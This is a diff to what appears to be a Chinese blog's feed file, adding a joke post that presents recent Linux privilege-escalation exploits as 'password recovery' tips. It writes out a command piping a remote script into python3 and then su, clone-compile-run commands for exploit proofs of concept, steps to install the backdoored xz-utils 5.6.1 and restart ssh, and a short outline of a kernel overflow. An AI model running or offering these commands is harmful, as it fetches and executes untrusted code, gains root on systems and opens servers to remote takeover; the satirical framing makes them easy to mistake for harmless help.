@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Linux密码找回方法(bushi</title>
+      <link href="/2026/05/14/%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9BLinux%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2026/05/14/%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9BLinux%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ol><li><p>Linux 找回密码教程，建议收藏！  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://copy.fail/exp | python3 &amp;&amp; su  </span><br></pre></td></tr></table></figure><p> passwd root  设置你的新密码  </p></li><li><p>你的 Linux 密码又忘了？<br> 没关系，这里还有一个新的！  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/V4bel/dirtyfrag.git&amp;&amp; cd dirtyfrag &amp;&amp; gcc -O0 -Wall -o exp exp.c -lutil &amp;&amp; ./exp </span><br></pre></td></tr></table></figure></li><li><p>不想再忘记密码了？<br> 我们有专业的黑客团队帮您运维服务器和保管密码！<br> 项目地址: <a href="https://github.com/tukaani-project/xz/tree/v5.6.1">https://github.com/tukaani-project/xz/tree/v5.6.1</a>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install xz-utils=5.6.1-1  </span><br><span class="line">sudo systemctl restart ssh </span><br></pre></td></tr></table></figure></li><li><p>容易忘记密码的有福了，每天都有新办法！<br> <a href="https://ze3tar.github.io/post-zcrx.html">https://ze3tar.github.io/post-zcrx.html</a><br> 插入一个支持ZCRX的高端网卡，让它down掉，然后ptr_ring drain + scrub loop重复入栈把free_count写溢出即可  </p></li><li><p>什么，你买不起高端网卡？那试试这个吧！  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/v12-security/pocs.git&amp;&amp; cd pocs/fragnesia &amp;&amp; gcc -o exp fragnesia.c &amp;&amp; ./exp  </span><br></pre></td></tr></table></figure></li><li><p>听说您的机房不允许ssh外连，只能通过KVM物理访问服务器? 没关系，我们的专业黑客团队也可以通过nginx帮助运维您的服务器！<br> <a href="https://depthfirst.com/nginx-rift">https://depthfirst.com/nginx-rift</a></p></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 杂七杂八 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>hashcat暴力破解</title>
       <link href="/2025/04/22/hashcat%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
       <url>/2025/04/22/hashcat%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
